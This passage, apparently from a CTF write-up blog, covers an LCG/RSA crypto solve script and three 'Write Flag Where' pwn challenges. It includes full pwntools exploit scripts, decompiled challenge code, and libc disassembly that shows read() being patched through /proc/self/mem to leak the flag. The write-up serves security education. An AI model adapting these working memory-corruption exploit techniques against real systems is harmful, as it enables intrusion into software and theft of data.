    :param c: the increment of the LCG (can be None)
    :return: a tuple containing the modulus, multiplier, and the increment
    """
    if m is None:
        assert len(y) >= 4, "At least 4 outputs are required to recover the modulus"
        for i in range(len(y) - 3):
            d0 = y[i + 1] - y[i]
            d1 = y[i + 2] - y[i + 1]
            d2 = y[i + 3] - y[i + 2]
            g = d2 * d0 - d1 * d1
            m = g if m is None else gcd(g, m)

        #assert is_prime_power(m), "Modulus must be a prime power, try providing more outputs"

    gf = Zmod(m)
    if a is None:
        assert len(y) >= 3, "At least 3 outputs are required to recover the multiplier"
        x0 = gf(y[0])
        x1 = gf(y[1])
        x2 = gf(y[2])
        a = int((x2 - x1) / (x1 - x0))

    if c is None:
        assert len(y) >= 2, "At least 2 outputs are required to recover the multiplier"
        x0 = gf(y[0])
        x1 = gf(y[1])
        c = int(x1 - a * x0)

    return m, a, c

lcg = list(map(int, open("dump.txt", "r").read().split()))
seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
lcg = [seed] + lcg

print(lcg)
m, a, c = attack(lcg)
print(m, a, c)

# verify output
for i in range(len(lcg) - 1):
    assert (a*lcg[i]+c)%m == lcg[i+1]

# taken from generate.py
class LCG:
    global m, a, c
    lcg_m = a
    lcg_c = c
    lcg_n = m

    def __init__(self, lcg_s):
        self.state = lcg_s

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state

# Find prime value of specified bits a specified amount of times
seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
lcg = LCG(seed)
primes_arr = []

dump = False
items = 0
#dump_file = open("dump.txt", "w")

primes_n = 1
while True:
    for i in range(8):
        while True:
            prime_candidate = lcg.next()
            if dump:
                dump_file.write(str(prime_candidate) + '\n')
                items += 1
                if items == 6:
                    dump = False
                    dump_file.close()
            if not isPrime(prime_candidate):
                continue
            elif prime_candidate.bit_length() != 512:
                continue
            else:
                primes_n *= prime_candidate
                primes_arr.append(prime_candidate)
                break

    # Check bit length
    if primes_n.bit_length() > 4096:
        print("bit length", primes_n.bit_length())
        primes_arr.clear()
        primes_n = 1
        continue
    else:
        break

# Create public key 'n'
n = 1
for j in primes_arr:
    n *= j
print("[+] Public Key: ", n)
print("[+] size: ", n.bit_length(), "bits")

# now decrypt the flag with p and q
print(primes_arr)
phi = 1
for k in primes_arr:
    phi *= (k - 1)

key = RSA.importKey(open("public.pem", "rb").read())
print(key.e, key.n)
print(key.n == n)
e = key.e

d = pow(e, -1, phi)

c = int.from_bytes(open("flag.txt", "rb").read(), "little")
print(c)

print(long_to_bytes(pow(c, d, n)))
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="lcg_solve_py"
    button-text="Show solve.py" toggle-text=lcg_solve_py %}

---
# Pwn
## Write Flag Where [1~3]
```text
Part1:
This challenge is not a classical pwn
In order to solve it will take skills of your own
An excellent primitive you get for free
Choose an address and I will write what I see
But the author is cursed or perhaps it's just out of spite
For the flag that you seek is the thing you will write
ASLR isn't the challenge so I'll tell you what
I'll give you my mappings so that you'll have a shot.

Part2:
Was that too easy? Let's make it tough
It's the challenge from before, but I've removed all the fluff

Part3:
Your skills are considerable, I'm sure you'll agree
But this final level's toughness fills me with glee
No writes to my binary, this I require
For otherwise I will surely expire

nc wfw[123].2023.ctfcompetition.com 1337
solves 294 / 155 / 43
```

### overview
From reversing the challenge, we can quickly identify the behavior. The challenge first output the process map, allowing us to know pie, libc, and stack addresses. It then close stdin/stdout/stderr, and only accept inputs from fd 1337. Lastly, the challenge goes into a while loop, taking an address and a count, then write count number of bytes of flag to the specified address. Note that the flag is written by writting directly to the process memory file, so all addresses are writable, **including the code themselves**. This will be handy for part 3.

The decompiled code from ghidra for part 3, with some modification to reflect each level:
{% capture wfw_chal_c %}
```c
int main(){
  local_c = open("/proc/self/maps",0);
  read(local_c,maps,0x1000);
  close(local_c);
  local_10 = open("./flag.txt",0);
  if (local_10 == -1) {
    puts("flag.txt not found");
  }
  else {
    sVar2 = read(local_10,flag,0x80);
    if (0 < sVar2) {
      close(local_10);
      local_14 = dup2(1,0x539);
      local_18 = open("/dev/null",2);
      dup2(local_18,0);
      dup2(local_18,1);
      dup2(local_18,2);
      close(local_18);
      alarm(0x3c);
      dprintf(local_14,
              "Your skills are considerable, I\'m sure you\'ll agree\nBut this final level\'s toughn ess fills me with glee\nNo writes to my binary, this I require\nFor otherwise I will s urely expire\n"
             );
      dprintf(local_14,"%s\n\n",maps);
      while( true ) {
	// dprintf(local_14,"Give me an address and a length just so:\n<address> <length>\nAnd I\'ll write it wh erever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I  will happily expire\n"); // part 1
        local_78 = 0;
        local_70 = 0;
        local_68 = 0;
        local_60 = 0;
        local_58 = 0;
        local_50 = 0;
        local_48 = 0;
        local_40 = 0;
        sVar2 = read(local_14,&local_78,0x40);
        local_1c = (undefined4)sVar2;
        iVar1 = __isoc99_sscanf(&local_78,"0x%llx %u",&local_28,&local_2c);
	// if (((iVar1 != 2) || (0x7f < local_2c))) // part 2
        if (((iVar1 != 2) || (0x7f < local_2c)) || ((main - 0x5000 < local_28 && (local_28 < main + 0x5000)))) // part 3
        break;
        local_20 = open("/proc/self/mem",2);
        lseek64(local_20,local_28,0);
        write(local_20,flag,(ulong)local_2c);
        close(local_20);
      }
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    puts("flag.txt empty");
  }
  return 1;
}
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_chal_c"
    button-text="Show chal.c" toggle-text=wfw_chal_c %}
### Part 1
For part 1, there is a dprintf function call after the entrence to the while loop, so writing the flag to the string that are printed each loop can leak the flag. 

`CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}`

{% capture wfw_solve_py %}
```python
from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

def connect():
        nc_str = "nc wfw1.2023.ctfcompetition.com 1337"
        _, host, port = nc_str.split(" ")
        p = remote(host, int(port))

    return p

def main():
    p = connect()
    p.recvuntil(b"shot.\n")
    s = p.recvline()
    elf.address = int(s.split(b'-')[0], 16)
    print(hex(elf.address))

    p.sendline(f"{hex(elf.address + 0x21e0)} 60")

    p.interactive()


if __name__ == "__main__":
    main()
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_solve_py"
    button-text="Show solve.py" toggle-text=wfw_solve_py %}

### Part 2
Part 2 proves to be trickier. In ghidra, the exit call stopped the decompiler from disassembling the code further, therefore missing a dprintf function call after the `exit(0)` call. Instead, I tried to leak the flag using the sscanf function with the string `0x%llx %u`. 
The sscanf function call will attempt to match the input format string from the input string. In the original challenge, it's trying to match the starting 0x before reading the hex numbers as input. For example, if we overwrite the format string to `Cx%llx %u` and send the input `Cx0 0`, the program will continue normally, but input `Dx0 0` will exit immediately after. Therefore, we can overwrite that string, then attempt to read different strings, leaking the flag byte by byte. See `solve2.py` for implementation details.

`CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?}`

{% capture wfw_solve2_py %}
```python
#!/usr/bin/python3
from pwn import *
elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

def connect():
        nc_str = "nc wfw2.2023.ctfcompetition.com 1337"
        _, host, port = nc_str.split(" ")
        p = remote(host, int(port))

    return p

def attempt(cur_flag, ch):
    p = connect()
    p.recvuntil(b"fluff\n")
    elf.address = int(p.recvline().split(b'-')[0], 16)

    for i in range(6):
        p.recvline()

    libc.address = int(p.recvline().split(b'-')[0], 16)

    for i in range(11):
        p.recvline()

    stack_base = int(p.recvline().split(b'-')[0], 16)

    for i in range(5):
        p.recvline()

#    print(hex(elf.address), hex(libc.address), hex(stack_base))
    count = len(cur_flag)+1
    target_address = elf.address+0x20bc-(count-1)
    overwrite_str = hex(target_address)
    p.sendline(f"{overwrite_str} {count}")

    overwrite_str = hex(target_address)
    p.sendline(f"{ch}{overwrite_str[1:]} {count}")

    overwrite_str = hex(target_address)
    p.sendline(f"-{overwrite_str[1:]} {count}")

    try:
        p.recv(1, timeout=1)
    except Exception:
        p.close()
        return False
    p.close()
    return True

def main():
    context.log_level='critical'
    FLAG = "CTF{"
    for l in range(100):
        for c in "_"+string.printable[:-7]:
            print(FLAG+c)
            if attempt(FLAG, c):
                FLAG+=c
                break
        if FLAG[-1] == "}":
            break
    print(FLAG)


if __name__ == "__main__":
    main()
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_solve2_py"
    button-text="Show solve2.py" toggle-text=wfw_solve2_py  %}
	
### Part 3
Lastly for part 3, we can't write into the main binary region, including the all the data sections. After looking through the functions in libc that are used, I found that the read function is the most likely function to be hijacked, since the arguments used to call the function is helpful. 

Meanwhile, I also look for some useful instructions we can create using the flag prefix. I notice that 0x43 ('C') is a prefix in x86 assembly, and can be used to nop out instruction with minimal effects on most registers. Another interesting instruction is 0x7b ('{'), which is jnp. This allow use to jmp further down the program. The changes made to the read function is as follow: 
1. Overwrite the second syscall to set rsi from rsp+0x43
2. Overwrite ja after second syscall to jnp to jump downward
3. Overwrite jump direction of the last jmp to jump to write function
4. Overwrite broken instructions with nop so it doesn't segfault
5. Overwrite the first return in the read function to trigger the full exploit.

see `libc_original.asm` for the original libc function (disassembled from ghidra), and `libc_changed.asm` for the final state after all the writes, along with some comments to how the final payload achieved the target.

{% capture wfw_before_asm %}
```text
// ssize_t read(int __fd,void *__buf,size_t __nbytes)
        00214980 f3 0f 1e fa     ENDBR64
        00214984 64 8b 04        MOV        EAX,dword ptr FS:[0x18]
                 25 18 00 
                 00 00
        0021498c 85 c0           TEST       EAX,EAX
        0021498e 75 10           JNZ        LAB_002149a0
        00214990 0f 05           SYSCALL
        00214992 48 3d 00        CMP        RAX,-0x1000
                 f0 ff ff
        00214998 77 56           JA         LAB_002149f0
        0021499a c3              RET
        0021499b 0f              ??         0Fh
        0021499c 1f              ??         1Fh
        0021499d 44              ??         44h    D
        0021499e 00              ??         00h
        0021499f 00              ??         00h
                             LAB_002149a0  
        002149a0 48 83 ec 28     SUB        RSP,0x28
        002149a4 48 89 54        MOV        qword ptr [RSP + local_10],__nbytes
                 24 18
        002149a9 48 89 74        MOV        qword ptr [RSP + local_18],__buf
                 24 10
        002149ae 89 7c 24 08     MOV        dword ptr [RSP + local_20],__fd
        002149b2 e8 b9 c0        CALL       __pthread_enable_asynccancel 
                 f7 ff
        002149b7 48 8b 54        MOV        __nbytes,qword ptr [RSP + local_10]
                 24 18
        002149bc 48 8b 74        MOV        __buf,qword ptr [RSP + local_18]
                 24 10
        002149c1 41 89 c0        MOV        R8D,EAX
        002149c4 8b 7c 24 08     MOV        __fd,dword ptr [RSP + local_20]
        002149c8 31 c0           XOR        EAX,EAX
        002149ca 0f 05           SYSCALL
        002149cc 48 3d 00        CMP        RAX,-0x1000
                 f0 ff ff
        002149d2 77 34           JA         LAB_00214a08
                             LAB_002149d4
        002149d4 44 89 c7        MOV        __fd,R8D
        002149d7 48 89 44        MOV        qword ptr [RSP + local_20],RAX
                 24 08
        002149dc e8 ff c0        CALL       __pthread_disable_asynccancel 
                 f7 ff
        002149e1 48 8b 44        MOV        RAX,qword ptr [RSP + local_20]
                 24 08
        002149e6 48 83 c4 28     ADD        RSP,0x28
        002149ea c3              RET
        002149eb 0f              ??         0Fh
        002149ec 1f              ??         1Fh
        002149ed 44              ??         44h    D
        002149ee 00              ??         00h
        002149ef 00              ??         00h
                             LAB_002149f0
        002149f0 48 8b 15        MOV        __nbytes,qword ptr [PTR_00318e10]
                 19 44 10 00
        002149f7 f7 d8           NEG        EAX
        002149f9 64 89 02        MOV        dword ptr FS:[__nbytes],EAX
        002149fc 48 c7 c0        MOV        RAX,-0x1
                 ff ff ff ff
        00214a03 c3              RET
        00214a04 0f              ??         0Fh
        00214a05 1f              ??         1Fh
        00214a06 40              ??         40h    @
        00214a07 00              ??         00h
                             LAB_00214a08
        00214a08 48 8b 15        MOV        __nbytes,qword ptr [PTR_00318e10]
                 01 44 10 00
        00214a0f f7 d8           NEG        EAX
        00214a11 64 89 02        MOV        dword ptr FS:[__nbytes],EAX
        00214a14 48 c7 c0        MOV        RAX,-0x1
                 ff ff ff ff
        00214a1b eb b7           JMP        LAB_002149d4
        00214a1d 0f              ??         0Fh
        00214a1e 1f              ??         1Fh
		
		
// ssize_t write(int __fd,void *__buf,size_t __n)
        00214a20 f3 0f 1e fa     ENDBR64
        00214a24 64 8b 04        MOV        EAX,dword ptr FS:[0x18]
                 25 18 00 
                 00 00
        00214a2c 85 c0           TEST       EAX,EAX
        00214a2e 75 10           JNZ        LAB_00214a40
        00214a30 b8 01 00        MOV        EAX,0x1
                 00 00
        00214a35 0f 05           SYSCALL
        00214a37 48 3d 00        CMP        RAX,-0x1000
                 f0 ff ff
        00214a3d 77 51           JA         LAB_00214a90
        00214a3f c3              RET
                             LAB_00214a40      
        00214a40 48 83 ec 28     SUB        RSP,0x28
        00214a44 48 89 54        MOV        qword ptr [RSP + local_10],__n
                 24 18
        00214a49 48 89 74        MOV        qword ptr [RSP + local_18],__buf
                 24 10
        00214a4e 89 7c 24 08     MOV        dword ptr [RSP + local_20],__fd
        00214a52 e8 19 c0        CALL       __pthread_enable_asynccancel  
                 f7 ff
        00214a57 48 8b 54        MOV        __n,qword ptr [RSP + local_10]
                 24 18
        00214a5c 48 8b 74        MOV        __buf,qword ptr [RSP + local_18]
                 24 10
        00214a61 41 89 c0        MOV        R8D,EAX
        00214a64 8b 7c 24 08     MOV        __fd,dword ptr [RSP + local_20]
        00214a68 b8 01 00        MOV        EAX,0x1
                 00 00
        00214a6d 0f 05           SYSCALL
        00214a6f 48 3d 00        CMP        RAX,-0x1000
                 f0 ff ff
        00214a75 77 31           JA         LAB_00214aa8
                             LAB_00214a77    
        00214a77 44 89 c7        MOV        __fd,R8D
        00214a7a 48 89 44        MOV        qword ptr [RSP + local_20],RAX
                 24 08
        00214a7f e8 5c c0        CALL       __pthread_disable_asynccancel 
                 f7 ff
        00214a84 48 8b 44        MOV        RAX,qword ptr [RSP + local_20]
                 24 08
        00214a89 48 83 c4 28     ADD        RSP,0x28
        00214a8d c3              RET
        00214a8e 66              ??         66h    f
        00214a8f 90              ??         90h
                             LAB_00214a90       
        00214a90 48 8b 15        MOV        __n,qword ptr [PTR_00318e10] 
                 79 43 10 00
        00214a97 f7 d8           NEG        EAX
        00214a99 64 89 02        MOV        dword ptr FS:[__n],EAX
        00214a9c 48 c7 c0        MOV        RAX,-0x1
                 ff ff ff ff
        00214aa3 c3              RET
        00214aa4 0f              ??         0Fh
        00214aa5 1f              ??         1Fh
        00214aa6 40              ??         40h    @
        00214aa7 00              ??         00h
                             LAB_00214aa8     
        00214aa8 48 8b 15        MOV        __n,qword ptr [PTR_00318e10] 
                 61 43 10 00
        00214aaf f7 d8           NEG        EAX
        00214ab1 64 89 02        MOV        dword ptr FS:[__n],EAX
        00214ab4 48 c7 c0        MOV        RAX,-0x1
                 ff ff ff ff
        00214abb eb ba           JMP        LAB_00214a77
        00214abd 0f              ??         0Fh
        00214abe 1f              ??         1Fh
        00214abf 00              ??         00h
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_before_asm"
    button-text="Show libc_original.asm" toggle-text=wfw_before_asm  %}
		
{% capture wfw_after_asm %}
```text
0x7fca9f372980 <read>:     endbr64
0x7fca9f372984 <read+4>:   mov    eax,DWORD PTR fs:0x18
0x7fca9f37298c <read+12>:  test   eax,eax
0x7fca9f37298e <read+14>:  jne    0x7fca9f3729a0 <read+32>

// read payload so that rsp+0x43 = flag location
0x7fca9f372990 <read+16>:  syscall 

0x7fca9f372992 <read+18>:  cmp    rax,0xfffffffffffff000
0x7fca9f372998 <read+24>:  ja     0x7fca9f3729f0 <read+112>
//was ret, overwrite to start payload
0x7fca9f37299a <read+26>:  rex.XB 
0x7fca9f37299b <read+27>:  rex.XB //C
0x7fca9f37299c <read+28>:  rex.XB //C
0x7fca9f37299d <read+29>:  rex.XB //C
0x7fca9f37299e <read+30>:  rex.XB //C
0x7fca9f37299f <read+31>:  rex.XB //C
0x7fca9f3729a0 <read+32>:  sub    rsp,0x28
0x7fca9f3729a4 <read+36>:  mov    QWORD PTR [rsp+0x18],rdx
0x7fca9f3729a9 <read+41>:  mov    QWORD PTR [rsp+0x10],rsi
0x7fca9f3729ae <read+46>:  mov    DWORD PTR [rsp+0x8],edi
0x7fca9f3729b2 <read+50>:  rex.XB //C
0x7fca9f3729b3 <read+51>:  rex.XB //C
0x7fca9f3729b4 <read+52>:  rex.XB //C
0x7fca9f3729b5 <read+53>:  rex.XB //C
0x7fca9f3729b6 <read+54>:  rex.XB //C
0x7fca9f3729b7 <read+55>:  mov    rdx,QWORD PTR [rsp+0x18]

//C, load flag location into rsi
0x7fca9f3729bc <read+60>:  mov    rsi,QWORD PTR [rsp+0x43] 

0x7fca9f3729c1 <read+65>:  mov    r8d,eax
0x7fca9f3729c4 <read+68>:  mov    edi,DWORD PTR [rsp+0x8]
0x7fca9f3729c8 <read+72>:  xor    eax,eax

// read CT, rax = 2, cmp gives no parity, jmp
0x7fca9f3729ca <read+74>:  syscall 
0x7fca9f3729cc <read+76>:  cmp    rax,0x7b465443 //CTF{ {
0x7fca9f3729d2 <read+82>:  jnp    0x7fca9f372a08 <read+136>

[...]
0x7fca9f372a08 <read+136>: rex.XB //C
0x7fca9f372a09 <read+137>: rex.XB //C
0x7fca9f372a0a <read+138>: rex.XB //C
0x7fca9f372a0b <read+139>: rex.XB //C
0x7fca9f372a0c <read+140>: rex.XB //C
0x7fca9f372a0d <read+141>: rex.XB //C
0x7fca9f372a0e <read+142>: rex.XB neg r8d
0x7fca9f372a11 <read+145>: mov    DWORD PTR fs:[rdx],eax
0x7fca9f372a14 <read+148>: mov    rax,0xffffffffffffffff
0x7fca9f372a1b <read+155>: jmp    0x7fca9f372a60 <write+64> //C
[...]
0x7fca9f372a60 <write+64>: rex.XB //C
0x7fca9f372a61 <write+65>: mov    r8d,eax

// write 1337, flag, 0x40
0x7fca9f372a64 <write+68>: mov    edi,DWORD PTR [rsp+0x8]
0x7fca9f372a68 <write+72>: mov    eax,0x1
0x7fca9f372a6d <write+77>: syscall 
[...]
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_after_asm"
    button-text="Show libc_changed.asm" toggle-text=wfw_after_asm  %}

After overwriting the first return, I control the input to the read syscall to manipulate the content in rsp+0x43, and write the flag location there, so the write syscall will leak out the flag. To overcome the issue of no output, I add a sleep between each input to make sure the remove server have enough time to process each input. A better solution will be to pad each input to 0x40 bytes, then no delay will be needed. The solve script is in solve3.py. 

`CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}`
{% capture wfw_solve3_py %}
```python
from pwn import *
import time

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]


def connect():
    if args.REMOTE:
        nc_str = "nc wfw3.2023.ctfcompetition.com 1337"
        _, host, port = nc_str.split(" ")
        p = remote(host, int(port))

    else:
        os.system("ulimit -n 2048")
        p = process([elf.path], preexec_fn = lambda: os.dup2(0, 1337))
        if args.GDB:
           gdb_script = """
           b *main+638
           c 20
           """
           gdb.attach(p, gdb_script)

    return p


def main():
    p = connect()

    def write(addr, len):
        #p.stdout.write(f'0x{addr:x} {len}\n'.encode())
        p.sendline(f'0x{addr:x} {len}'.encode())

        time.sleep(0.5)

    libc_found = False
    elf_found = False
    while True:
        line = p.recvline().decode('ascii').strip()
        if 'chal' in line and not elf_found:
            elf_base = int(line.split()[0].split('-')[0], 16)
            elf_found = True

        if line.endswith('libc.so.6') and not libc_found:
            libc_base = int(line.split()[0].split('-')[0], 16)
            libc_found = True

        if line.endswith('[stack]'):
            stack_bottom = int(line.split()[0].split('-')[1], 16)
            break

    print(hex(elf_base))
    print(hex(libc_base))
    print(hex(stack_bottom))

    input_buf_offset = 5856

    for i in range(0x1149b2, 0x1149b7):
        write(libc_base + i, 1)

    for i in range(0x114a08, 0x114a0f):
        write(libc_base + i, 1)

    write(libc_base + 0x114a60, 1)

    write(libc_base + 0x1149cf, 4)
    write(libc_base + 0x1149ce, 4)

    write(libc_base + 0x114a1c, 1)
    write(libc_base + 0x1149c0, 1)

    write(libc_base + 0x11499f, 1)
    write(libc_base + 0x11499e, 1)
    write(libc_base + 0x11499d, 1)
    write(libc_base + 0x11499c, 1)
    write(libc_base + 0x11499b, 1)
    write(libc_base + 0x11499a, 1)
    p.send(("a"*0x13).encode()+p64(elf_base + 0x50a0))
    time.sleep(0.5)
    p.send(b"CT")

    p.interactive()


if __name__ == "__main__":
    main()

#CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="wfw_solve3_py"
    button-text="Show solve3.py" toggle-text=wfw_solve3_py  %}
